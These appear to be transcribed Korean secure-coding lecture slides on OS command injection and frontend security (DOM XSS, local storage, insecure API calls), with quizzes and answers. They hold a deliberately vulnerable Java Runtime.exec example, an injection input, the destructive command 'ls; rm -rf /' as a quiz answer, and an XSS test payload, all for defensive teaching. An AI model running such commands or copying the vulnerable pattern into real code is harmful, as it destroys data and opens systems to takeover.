Runtime.getRuntime().exec(cmd + " c:\\prog_cmd\\" + version);
...
안전한 코드
...
String version = request.getParameter("version");
if(version.matches("[0-9.]+")) {
Runtime.getRuntime().exec(new String[]{"cmd.exe","/c", "run.bat", version});
} else {
부적합한 값으로 처리
}
…

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
코드(들여쓰기 포함 원문):

안전하지 않은 코드 (빨간 라벨)
```java
...
 String version = request.getParameter("version");
 String cmd = new String("cmd.exe /K \"run.bat \"");
 Runtime.getRuntime().exec(cmd + " c:\\prog_cmd\\" + version);
...
```

안전한 코드 (파란 라벨)
```java
...
 String version = request.getParameter("version");
 if(version.matches("[0-9.]+")) {
   Runtime.getRuntime().exec(new String[]{"cmd.exe","/c", "run.bat", version});
 } else {
    부적합한 값으로 처리
 }
…
```
[이미지] 제목 옆 자물쇠 아이콘, 코드 상자 위 라벨 리본("안전하지 않은 코드"=빨강, "안전한 코드"=파랑) — 장식용 이미지이며 코드 자체는 텍스트임.

(※ 검증: Python으로 Java 문자열 결합 결과 재현 — `cmd` 값은 `cmd.exe /K "run.bat "`, 최종 문자열은 version=`1.0 & dir` 일 때 `cmd.exe /K "run.bat " c:\prog_cmd\1.0 & dir`. cmd.exe /K 가 나머지 문자열을 해석하므로 `&` 뒤 `dir` 이 추가 실행됨 → 취약 — 일치)
(※ 검증: Java `String.matches()` 는 전체 일치이므로 Python `re.fullmatch(r"[0-9.]+")` 로 확인 — `1.0`, `1.2.3` 통과 / `1.0 & dir`, `1;ls`, `1.0&type …` 거부 — 일치. 단, `..` 같은 점만으로 된 값도 통과함(이 예제에서는 version 이 경로가 아닌 run.bat 인자로만 쓰여 영향은 제한적).)
(※ 참고: 안전한 코드도 여전히 cmd.exe /c 를 거쳐 run.bat 을 실행하므로, 인자 배열 방식만으로는 cmd.exe 의 메타문자 해석을 완전히 막지 못함 — 화이트리스트 정규식 검증이 실질적 방어선 역할을 함. 또 안전하지 않은 코드는 `/K`, 안전한 코드는 `/c` 로 옵션이 다름.)

---

## [2-SLIDES] 6주차 3차시 p.16 · Command 인젝션 대응 – 시큐어코딩 적용
Command 인젝션 대응 – 시큐어코딩 적용
안전한 API 사용
직접 OS 명령어를 실행하지 않고, 안전하게 프로세스를 실행하는 API (예: 인자 배열 방식의 ProcessBuilder, execvp() 등) 사용
→ Command 인젝션 위험을 줄이기 위해 파라미터와 명령어를 명확하게 분리
사용자 입력 값 검증
화이트리스트 기반 검증: 허용된 값만 받아들이고, 예상치 못한 입력은 모두 거부
→ 정규 표현식, 타입 체크 등을 활용하여 올바른 포맷만 통과
메타 문자 필터링
사용자 입력에서 특수문자 (&, ;, |, >, <, $(), `` 등)를 제거하거나 이스케이프 처리
→ 입력 값에 포함된 메타문자를 명시적으로 치환하거나 제거하여, 명령어 결합 우회 방지

---

## [2-SLIDES] 6주차 3차시 p.17 · Command 인젝션 대응 – 시큐어코딩 적용
Command 인젝션 대응 – 시큐어코딩 적용
에러 핸들링 및 로깅
입력 값 검증 실패 및 명령어 실행 오류 시, 민감 정보가 노출되지 않도록 안전하게 처리
→ 오류 발생 시 내부 로그에만 기록하고, 사용자에게는 최소한의 정보만 제공
코드 리뷰 및 정적 분석
정기적인 코드 리뷰와 정적 분석 도구를 활용하여 Command 인젝션 취약점 사전 탐지
보안 관련 라이브러리 및 프레임워크의 최신 업데이트 적용
테스트 케이스 마련
다양한 악의적 입력(우회 페이로드, 인코딩 변형 등)을 포함한 단위 테스트, 통합 테스트를 수행

---

## [2-SLIDES] 6주차 3차시 p.18 · Command 인젝션 대응 – 시스템 보호 전략
Command 인젝션 대응 – 시스템 보호 전략
1. 최소 권한 원칙 적용
애플리케이션 또는 명령어 실행 시 비 권한 사용자 계정을 활용
시스템 서비스나 웹 서버의 실행 권한 제한을 통해 공격 성공 시 피해 범위 최소화
2. 애플리케이션 샌드박싱 및 컨테이너화
샌드박스 환경 또는 컨테이너(예: Docker)를 이용해 애플리케이션 격리
외부 명령 실행 시 격리된 환경 내에서 실행하여 시스템 전체에 영향을 주지 않도록 구성
3. 로깅 및 모니터링 활성화
명령어 실행 로그, 에러 로그, 접근 로그를 체계적으로 기록
이상 행동 감지 시 즉각 알림 및 대응할 수 있는 모니터링 시스템 구축

---

## [2-SLIDES] 6주차 3차시 p.19 · 요약 정리
요약 정리
- Command 인젝션은 검증되지 않은 입력이 OS 명령어를 조작해 시스템을 장악하는 취약점입니다.
- 공격 원리는 메타문자(;, &, |)를 사용해 OS 명령어 파싱 방식을 악용하는 방식입니다.
- 취약점 진단은 수동 진단과 OWASP ZAP 같은 자동화 도구를 병행해 수행합니다.
- 대응 방안으로 입력 값 검증과 안전한 API 사용, 그리고 최소 권한·샌드박싱·모니터링을 사용합니다.
- 지속적으로 코드 리뷰와 CI/CD 보안 검증을 적용해 사전에 차단하고 재발을 방지해야 합니다.

---

## [2-SLIDES] 6주차 3차시 p.20 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 6주차 3차시 p.21 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 6주차 3차시 p.22 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**1. 다음 중 Windows 환경에서 Command 인젝션 위험을 줄이기 위한 방법으로 가장 옳은 것은 ?**
- 1) 문자열 결합으로 명령어를 만들고, 관리자 권한으로 실행한다.
- 2) 사용자 입력을 전혀 검증하지 않고 바로 cmd.exe /c에 전달한다.
- 3) 명령 인자를 배열로 분리하고, 권한이 제한된 계정으로 실행한다.
- 4) PowerShell 스크립트를 항상 시스템 권한으로만 실행한다.

**2. 다음 중 Command 인젝션 공격 예시로 볼 수 있는 것은 ?**
- 1) `ls –al`
- 2) `dir C:\Users`
- 3) `ls; rm -rf /`
- 4) `ping 127.0.0.1`

(※ 원문 표기 그대로 — 1)번 `ls –al` 의 하이픈이 일반 하이픈(-)이 아닌 en dash(–)로 입력되어 있음)

**3. Linux 환경에서 명령어를 연속 실행하기 위해 자주 사용되는 쉘 연산자 기호를 정확히 쓰세요.**

(            )

---

## [2-SLIDES] 6주차 3차시 p.23 · 퀴즈 정답
퀴즈 정답
1. 다음 중 Windows 환경에서 Command 인젝션 위험을 줄이기 위한 방법으로 가장 옳은 것은 ?
3) 명령 인자를 배열로 분리하고, 권한이 제한된 계정으로 실행한다.
인자를 배열로 분리하고, 최소 권한 계정을 사용해야 인젝션 위험이 낮아집니다.
2. 다음 중 Command 인젝션 공격 예시로 볼 수 있는 것은 ?
3) ls; rm -rf /
세미콜론 ;을 사용해 기존 명령 뒤에 rm -rf /를 추가로 실행하므로, 전형적인 인젝션 공격 시도입니다.
3. Linux 환경에서 명령어를 연속 실행하기 위해 자주 사용되는 쉘 연산자 기호를 정확히 쓰세요.
( ; )

# [2-SLIDES] 7주차 1차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · PreparedStatement/프리페어드 스테이트먼트/파라미터 바인딩/바인딩/setString · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · DOM XSS/DOM 기반 XSS/돔 기반/document.write/innerHTML · Command Injection/커맨드 인젝션/명령어 삽입/명령 삽입/OS Command/CWE-78 · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · SameSite/세임사이트/Strict/Lax/None · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · 화이트리스트/Whitelist/최소 허용/허용 목록 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · IDOR/Insecure Direct Object References/직접 객체 참조/수평 권한/수직 권한/권한 상승 · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링 · localStorage/sessionStorage/로컬 저장소/로컬 스토리지/Same-Origin · CORS/코어스/Cross-Origin/교차 출처 · ZAP/OWASP ZAP/Active Scan/Burp/버프스위트/버프 스위트 · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

## [2-SLIDES] 7주차 1차시 p.1 · 프론트엔드 데이터 처리
프론트엔드 데이터 처리
01 프론트엔드 데이터 처리 개념
02 프론트엔드 보안 이슈
03 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.2 · 학습 목표
학습 목표
웹 애플리케이션에서 프론트엔드 데이터 처리가 보안에 미치는 영향을 이해한다.
클라이언트 측(JavaScript)에서 발생할 수 있는 보안 취약점을 학습한다.
보안 강화를 위한 프론트엔드 개발 및 데이터 처리 방법을 익힌다.

---

## [2-SLIDES] 7주차 1차시 p.3 · 학습 내용
학습 내용
1. 프론트엔드 데이터 처리 개념
2. 프론트엔드 보안 이슈
3. 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.4 · 프론트엔드 데이터 처리
프론트엔드 데이터 처리
01 프론트엔드 데이터 처리 개념
02 프론트엔드 보안 이슈
03 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.5 · 클라이언트/서버 구조
클라이언트/서버 구조
정의 및 기본 개념
- 클라이언트: 사용자 인터페이스(UI)를 제공하며, 사용자의 요청(예: 브라우저, 모바일 앱)이 발생하는 프론트엔드 부분
- 서버: 클라이언트의 요청을 처리하고, 필요한 데이터를 생성하거나 제공하는 백엔드 시스템
통신 방식: 웹 환경에서 클라이언트와 서버는 주로 HTTP/HTTPS 프로토콜을 통해 네트워크 상에서 데이터를 주고받음
구조적 특징
- 분리된 역할: 클라이언트는 사용자 경험에 집중, 서버는 데이터 처리와 비즈니스 로직 수행
- 중앙 집중식 처리: 서버가 모든 요청을 받아 처리하고, 클라이언트는 결과를 화면에 표시
- 확장성: 서버를 확장하여 여러 클라이언트의 요청을 처리할 수 있음
통신 흐름에 따른 처리 형태
① 클라이언트 : [요청 전송] 사용자가 서버로 웹 페이지를 요청하거나 데이터를 입력
② 서버 : [요청 처리] 서버가 요청을 받아 비즈니스 로직 실행, 데이터베이스 연동 등 수행
③ 서버 : [응답 전송] 처리 결과를 클라이언트에 반환, 웹 페이지 렌더링 또는 API 응답 제공

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[도식: 클라이언트/서버 통신]** (슬라이드 오른쪽 하단 그림)
- 왼쪽: 데스크톱 PC 아이콘 — 라벨 `Client`
- 오른쪽: 서버 랙 아이콘 — 라벨 `Server`
- 위쪽 화살표 Client → Server: `Request`
- 아래쪽 화살표 Server → Client: `Response`
→ ① 클라이언트가 요청(Request) 전송 → ② 서버가 처리 → ③ 서버가 응답(Response) 반환하는 흐름을 나타냄.

---

## [2-SLIDES] 7주차 1차시 p.6 · 프론트엔드의 역할
프론트엔드의 역할
프론트엔드 정의
사용자와 직접 상호작용하는 웹 애플리케이션의 "보이는 부분"
브라우저에서 실행되며, HTML, CSS, JavaScript 등을 활용
주요 역할
- UI/UX 제공
사용자 친화적인 인터페이스 설계 및 반응형 디자인 구현
사용자 경험(UX) 개선 및 접근성 고려
- 데이터 시각화 및 인터랙션
사용자 입력 처리, 애니메이션 및 동적 콘텐츠 제공
클라이언트-서버 간 데이터 교환 및 API 호출 처리
- 표출 성능 최적화
페이지 로딩 속도 향상, 리소스 압축 및 캐싱 전략 적용
출처: https://medium.com/@adityagaba1322/streamlining-backend-frontend-integration-a-quick-guide-145eca3cca05

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[도식: FRONT-END / BACK-END 구성]** (슬라이드 오른쪽 그림, 출처 medium.com)
- 왼쪽 파란 영역 **FRONT-END**
  - `Web App`(모니터 화면 아이콘) ↔ `Mobile App`(스마트폰 아이콘) — 양방향 화살표
  - 아래로 화살표 → 프론트엔드 기술 아이콘: `HTML`, `CSS`, `JS`, Node.js(JS 육각형 로고)
- 가운데 양방향 화살표: FRONT-END(Web App/Mobile App) ↔ `Server`
- 오른쪽 초록 영역 **BACK-END**
  - `Server`(서버 랙 아이콘)에서 화살표로 `Database`(DB 원통 아이콘), `API`(API 창 + 톱니바퀴 아이콘)와 연결
  - Server에서 아래로 화살표 → 백엔드 언어 아이콘: `Java`, Python, C++, PHP(톱니바퀴)

---

## [2-SLIDES] 7주차 1차시 p.7 · 프론트엔드에서 입력 데이터 처리 방식
프론트엔드에서 입력 데이터 처리 방식
입력 데이터 캡처
- 이벤트 리스너(Event Listener) 활용
사용자의 입력 이벤트(예: onChange, onInput, onSubmit)를 통해 입력 데이터를 캡처
- 양방향 데이터 바인딩
React, Angular, Vue 등 프레임워크에서 제공하는 바인딩 기법으로 UI와 상태를 동기화
입력 데이터 유효성 검증
- HTML5 내장 검증
required, pattern, min, max 등의 속성으로 기본 검증 수행
- 클라이언트 사이드 JavaScript 검증
정규표현식 및 커스텀 함수로 복잡한 유효성 검증 로직 적용
- 즉각적 피드백 제공
실시간 에러 메시지 표시 및 UI 업데이트를 통해 사용자 경험 향상

---

## [2-SLIDES] 7주차 1차시 p.8 · 프론트엔드에서 입력 데이터 처리 방식
프론트엔드에서 입력 데이터 처리 방식
입력 데이터 보안 처리
- 입력값 이스케이핑(Escaping) 및 필터링
XSS 및 인젝션 공격 방지를 위해 사용자 입력값을 안전하게 이스케이프 처리
서드파티 라이브러리(예: DOMPurify) 사용하여 HTML 및 스크립트 태그 제거
- 정적 분석 및 테스트
클라이언트 코드 내 입력 처리 로직에 대한 보안 리뷰 및 단위 테스트 수행
입력 데이터 서버로 전송
- 안전한 AJAX/Fetch 요청
HTTPS를 통한 암호화된 통신으로 데이터 전송
- 오류 처리 및 로깅
전송 실패나 검증 오류 시 사용자에게 명확한 메시지 제공 및 클라이언트 측 로그 기록

---

## [2-SLIDES] 7주차 1차시 p.9 · 프론트엔드에서 입력 데이터 처리 방식
프론트엔드에서 입력 데이터 처리 방식
1. 특정 페이지 요청을 백엔드가 받아 적절히 HTML을 완성하여 응답한 것을 렌더링하여 화면 표출
- Static HTML(화면구성) + JavaScript(입력제어)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처 왼쪽: Burp Suite 요청/응답 (Raw 탭)]** — 게시판 목록 페이지 요청 시 서버가 완성된 HTML을 응답(SSR 방식)

Request (Pretty / **Raw** / Hex 탭 중 Raw 선택):
```http
GET /board/list HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost:8000/board/main
Cookie: JSESSIONID=C9F78A5C7408DFFAD96E407CF0FBC53D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Response (Pretty / **Raw** / Hex / Render 탭 중 Raw 선택):
```http
HTTP/1.1 200
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: text/html;charset=UTF-8
Content-Language: ko-KR
Date: Wed, 05 Mar 2025 05:57:13 GMT
Connection: close
Content-Length: 4432
```
응답 본문 16~25행 (**빨간 박스 강조** — 서버가 완성해서 보낸 HTML):
```html
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <title>시큐어코딩랩 - 게시판 목록</title>
   universal 
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <link rel="stylesheet" href="../../css/main.css">
```
(※ 검증: Python으로 확인 — 2025-03-05는 수요일(Wed)로 Date 헤더와 일치, JSESSIONID 값은 32자리 16진수)

**[파란 화살표 →] 화면 캡처 오른쪽: 브라우저 렌더링 결과**
- 탭 제목 `시큐어코딩랩 - 게시판 목록`, 주소창 `localhost:8000/board/list`
- 상단 배너: (주)오픈이지 로고 + `안전한 소프트웨어를 만들기 위한 노력`
- 메뉴: `메인` | `게시판` | `시큐어코딩 테스트` | `DB 초기화` — 우측 `[ test 님 ]` `로그아웃` `정보수정`
- 검색: 드롭다운 `제목` + 입력칸 + `검색` 버튼
- 게시판 표:

| # | 제목 | 작성자 | 댓글 | 조회 | 추천 | 작성일 |
|---|---|---|---|---|---|---|
| 1 | asfdasfds<script>alert('XSS!!');</script> | 테스트 | 0 | 2 | 0 | 2025-02-25 |

- 페이지 번호 `1`, 버튼 `목록` `쓰기`, 하단 `Copyright © (주)오픈이지 2021-2025`
- 제목에 넣은 `<script>alert('XSS!!');</script>`가 실행되지 않고 글자 그대로 표시됨 → 서버가 HTML 이스케이프(`&lt;script&gt;...`)하여 응답한 것으로 보임 (※ 검증: Python html.escape 결과 `asfdasfds&lt;script&gt;alert(&#x27;XSS!!&#x27;);&lt;/script&gt;` — 이렇게 인코딩되면 브라우저에 원문 문자열로 표시됨. 실제 응답 본문의 해당 행은 캡처에 보이지 않음)

---

## [2-SLIDES] 7주차 1차시 p.10 · 프론트엔드에서 입력 데이터 처리 방식
프론트엔드에서 입력 데이터 처리 방식
2. 기능별 API 요청에 따른 백엔드 처리 결과 정보를 프론트엔드에서 적극적으로 화면에 구성하여 표출
- Dynamic HTML(화면구성) + JavaScript(입력 제어 및 API 호출제어)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처 왼쪽: 브라우저(Firefox) 개발자 도구 네트워크 응답]** — 탭 `헤더` `쿠키` `요청` **`응답`(선택)** `타이밍` `스택 추적` `보안`, `속성 필터`, 형식 `JSON`. JSON 트리 전체가 **빨간 박스로 강조**됨 (백엔드 API가 화면 데이터 대신 JSON을 응답):
```text
menus: [ {…}, {…}, {…} ]
  0: Object { displayOrder: 1, name: "Drinks", id: "drinks", … }
     displayOrder: 1
     name: "Drinks"
     products: []
     children: [ {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…} ]
       0: Object { displayOrder: 1, name: "Hot Coffee", id: "hot-coffee", … }
       1: Object { displayOrder: 2, name: "Cold Coffee", id: "cold-coffee", … }
       2: Object { displayOrder: 3, name: "Hot Tea", id: "hot-tea", … }
       3: Object { displayOrder: 4, name: "Cold Tea", id: "cold-tea", … }
       4: Object { displayOrder: 5, name: "Refreshers", id: "refreshers", … }
       5: Object { displayOrder: 6, name: "Frappuccino® Blended Beverage", id: "frappuccino-blended-beverage", … }
       6: Object { displayOrder: 7, name: "Iced Energy", id: "iced-energy", … }
       7: Object { displayOrder: 8, name: "Hot Chocolate, Lemonade & More", id: "hot-chocolate-lemonade-more", … }
       8: Object { displayOrder: 9, name: "Bottled Beverages", id: "bottled-beverages", … }
     id: "drinks"
     uri: "/drinks"
  1: Object { displayOrder: 2, name: "Food", id: "food", … }
     displayOrder: 2
     name: "Food"
     products: []
     children: [ {…}, {…}, {…}, {…}, {…} ]
       0: Object { displayOrder: 1, name: "Breakfast", id: "breakfast", … }
       1: Object { displayOrder: 2, name: "Bakery", id: "bakery", … }
       2: Object { displayOrder: 3, name: "Treats", id: "treats", … }
       3: Object { displayOrder: 4, name: "Lunch", id: "lunch", … }
       4: Object { displayOrder: 5, name: "Snacks", id: "snacks", … }
     id: "food"
     uri: "/food"
  2: Object { displayOrder: 3, name: "At Home Coffee", id: "at-home-coffee", … }
     displayOrder: 3
     name: "At Home Coffee"
     products: []
     children: [ {…}, {…}, {…} ]   (접힌 상태)
     id: "at-home-coffee"
     uri: "/at-home-coffee"
```
(※ 검증: 요약 표기 `[ {…} ×9 ]`, `[ {…} ×5 ]`와 펼친 항목 수 9개(0~8)·5개(0~4) 일치)

**[파란 화살표 →] 화면 캡처 오른쪽: 브라우저에 동적으로 구성된 화면**
- 탭 `Home: Starbucks Coffee Comp…`, 주소창 `https://app.starbucks.com`
- 상단 메뉴: `ORDER` `CARDS` `GIFT`, 우측 `Find a store` `Sign in` `Join now`
- 좌측 인사말 `Good afternoon`(해 아이콘), 우측 `STARBUCKS® REWARDS` 카드 영역(무료 음료·생일 음료·앱 결제 혜택 안내 카드), `Join now` / `Sign in` 버튼, 하단 `Start an order` 버튼
→ API(JSON) 응답 데이터를 프론트엔드 JavaScript가 받아 화면(메뉴 등)을 구성하는 CSR 방식 예시

---

## [2-SLIDES] 7주차 1차시 p.11 · 프론트엔드 데이터 처리
프론트엔드 데이터 처리
01 프론트엔드 데이터 처리 개념
02 프론트엔드 보안 이슈
03 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.12 · DOM 기반 보안 문제
DOM 기반 보안 문제
정의 및 개념
DOM(Document Object Model)을 직접 조작하는 과정에서 발생하는 보안 취약점
→ 클라이언트 사이드에서 사용자 입력 또는 외부 데이터를 적절한 검증 없이 DOM에 반영하면, 공격자가 악의적 스크립트를
삽입할 수 있음
주요 특징
서버에서 처리되지 않고, 클라이언트(브라우저)에서만 발생
기존 XSS와 달리, DOM 조작 로직 내부에서 발생하는 경우가 많음
공격 유형
- DOM 기반 XSS: 문서 객체를 직접 조작하여 공격자가 임의의 스크립트를 실행시키는 공격
- 클라이언트 사이드 데이터 조작: 사용자 입력이나 URL 파라미터를 검증 없이 DOM에 삽입하는 경우

---

## [2-SLIDES] 7주차 1차시 p.13 · DOM 기반 보안 문제
DOM 기반 보안 문제
발생 경로
- 취약한 DOM 조작 함수 사용
innerHTML, document.write, outerHTML 등으로 사용자 입력을 직접 삽입
- 부적절한 입력 검증
URL 파라미터, 해시(fragment) 값 등 외부 데이터를 제대로 필터링하지 않음
- 동적 콘텐츠 생성
클라이언트에서 API 응답 또는 사용자 입력을 기반으로 동적으로 HTML을 생성할 때
구체적 예시
- URL 파라미터를 location.hash를 통해 DOM에 그대로 반영하는 경우
- 사용자 입력을 검증 없이 element.innerHTML에 할당하여 악성 스크립트 실행 가능
공격 시나리오
공격자가 문서의 URL을 변조해두면, 해당 페이지를 로드할 때 악성 스크립트가 실행되어 쿠키 탈취, 세션 하이재킹 등이 발생

---

## [2-SLIDES] 7주차 1차시 p.14 · JavaScript 실행 환경에서의 보안 문제
JavaScript 실행 환경에서의 보안 문제
JavaScript 실행 환경 특성
클라이언트 브라우저에서 동적으로 코드가 실행됨
다양한 방식으로 외부 데이터를 처리하고, 동적 코드 실행(dynamically executed code)이 가능함
보안 위협의 발생 원인
- 동적 코드 실행 함수 사용
eval(), new Function(), setTimeout()/setInterval()에서 문자열 인자 사용
- 글로벌 객체 노출
window나 document 같은 전역 변수나 객체가 오염되거나, 공격자가 조작 가능한 상태로 노출
- 서드파티 스크립트 및 라이브러리
외부 스크립트나 패키지의 취약점, 불충분한 검증 시 원치 않는 코드 실행 위험
- 프로토타입 체인
객체의 프로토타입에 악의적 속성을 추가하여, 애플리케이션 전체에 영향을 미침

---

## [2-SLIDES] 7주차 1차시 p.15 · 로컬 저장소의 보안 문제
로컬 저장소의 보안 문제
로컬 저장소란?
HTML5에서 제공하는 클라이언트 측 저장소 (localStorage, sessionStorage, IndexedDB)
→ 브라우저에 데이터를 저장할 수 있는 편리한 기능
주요 활용 범위
- 사용자 선호도, 테마, 임시 캐시 데이터 저장
- 비동기 웹 애플리케이션에서 상태 관리 및 빠른 데이터 접근
장점
- 서버와의 통신 없이 빠른 데이터 읽기/쓰기 가능
- 영구적 저장 (localStorage) 또는 세션 기반 저장 (sessionStorage)

---

## [2-SLIDES] 7주차 1차시 p.16 · 로컬 저장소의 보안 문제
로컬 저장소의 보안 문제
XSS 공격에 의한 데이터 탈취
XSS 취약점으로 악의적 스크립트가 실행될 경우, 로컬 저장소의 모든 데이터에 접근 가능
→ 저장된 민감 정보(인증 토큰, 개인정보 등)가 공격자에게 노출
암호화 미적용
로컬 저장소는 기본적으로 평문으로 데이터를 저장하므로, 민감 정보가 그대로 노출될 위험
데이터 무결성 위협
악성 스크립트가 저장된 데이터를 수정, 삭제하거나 조작할 수 있음
클라이언트 사이드에서 쉽게 접근 및 변경이 가능
Same-Origin Policy 한계
도메인 간 격리 적용되지만, 동일 도메인 내에서는 모든 스크립트가 접근 가능

---

## [2-SLIDES] 7주차 1차시 p.17 · 보안에 취약한 API 호출 방식
보안에 취약한 API 호출 방식
API 호출의 역할
프론트엔드에서 데이터를 주고받기 위한 핵심 통신 수단
사용자 인터랙션에 따라 동적으로 API를 호출하여 데이터를 갱신
취약한 API 호출 방식 사례
- 민감 데이터 노출
- 미암호화 통신
- 부적절한 인증/인가 처리
- 잘못된 CORS 설정

---

## [2-SLIDES] 7주차 1차시 p.18 · 보안에 취약한 API 호출 방식
보안에 취약한 API 호출 방식
민감 데이터 노출
API 호출 시 URL의 쿼리스트링에 민감 정보를 포함할 경우, 브라우저 기록, 로그, 캐시 등에서 쉽게 탈취 가능
네트워크 통신 취약점
HTTPS 미사용, 취약한 SSL/TLS 설정 등으로 중간자 공격(MITM) 위험 증가
암호화되지 않은 채널을 통해 민감 데이터가 평문 전송되는 경우
인증 및 권한 관리 취약점
프론트엔드에서 관리되는 토큰이 안전하게 보호되지 않으면, 탈취 후 권한 상승 공격 가능
만료되지 않은 토큰 또는 재발급 절차 미흡으로 인한 부적절한 접근 제어
CORS 및 API 접근 제어 문제
잘못 구성된 CORS 정책으로 인해 외부 악의적 도메인에서도 API 호출이 가능해짐
공개 API로 오인하여 불필요한 데이터 노출 위험

---

## [2-SLIDES] 7주차 1차시 p.19 · 프론트엔드 데이터 처리
프론트엔드 데이터 처리
01 프론트엔드 데이터 처리 개념
02 프론트엔드 보안 이슈
03 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.20 · 사용자 입력 값 검증 및 필터링
사용자 입력 값 검증 및 필터링
목적 및 필요성
사용자 입력이 악의적 코드(예: 스크립트, 명령어 등) 삽입 등 보안 공격의 진입점이 될 수 있음
→ 클라이언트 측에서 입력 값을 선별적으로 허용(화이트리스트)하거나,
불필요한 문자를 제거하여 XSS, Command Injection 등 다양한 취약점을 방어
검증 vs. 필터링
- 검증(Validation)
입력 값이 기대한 형식과 범위에 부합하는지 확인 (예: 이메일 형식, 숫자 범위 등)
- 필터링(Sanitization)
입력 값에서 위험한 특수문자(예: <, >, &, ;, | 등)를 제거하거나 이스케이프 처리하여 안전하게 변환
프론트엔드 역할
즉각적인 사용자 피드백 제공 및 초기 보안 방어선 역할 수행
하지만, 클라이언트 측 검증은 우회 가능하므로, 서버 측 검증이 병행되어야 함

---

## [2-SLIDES] 7주차 1차시 p.21 · 사용자 입력 값 검증 및 필터링
사용자 입력 값 검증 및 필터링
HTML5 기본 검증
<input> 태그의 type, required, pattern, min, max 등 속성을 활용해 기본적인 형식 검증
브라우저 내장 검증으로 사용자 경험(UX) 개선
JavaScript를 이용한 커스텀 검증
정규표현식을 사용하여 복잡한 형식의 유효성 검사 구현
(예) 이메일, 전화번호, 날짜 형식 등
실시간 유효성 검사로 에러 메시지 및 인라인 피드백 제공
입력 값 필터링 라이브러리 활용
DOMPurify, sanitize-html 등 서드 파티 라이브러리를 사용하여 HTML, 스크립트 태그 제거 및 안전한 값으로 변환
프레임워크(React, Angular, Vue 등)의 내장 기능을 활용해 XSS 공격을 사전에 차단

---

## [2-SLIDES] 7주차 1차시 p.22 · 사용자 입력 값 검증 및 필터링
사용자 입력 값 검증 및 필터링
최소 허용 원칙(Whitelist) 적용
허용할 입력 형식을 명시적으로 정의하고, 그 외의 값은 모두 거부
사용자 정의 입력의 경우, 미리 정의된 안전한 패턴과 비교하여 필터링
입력 값 이스케이프 처리
출력 전 HTML 엔티티 인코딩을 통해 DOM 삽입 시 악의적 스크립트 실행 방지
서버와 클라이언트 모두에서 일관되게 적용
클라이언트와 서버 검증의 이중 방어
클라이언트 측은 사용자 경험을 위한 초기 검증 수단으로 활용하고,
반드시 서버 측에서 최종 검증 및 필터링을 수행하여 보안 취약점을 최소화
정기적인 보안 테스트 및 코드 리뷰
정적 분석 도구와 보안 스캐너를 활용해 입력값 처리 로직에 취약점이 없는지 점검
개발 및 배포 주기마다 최신 보안 모범 사례를 반영하도록 업데이트

---

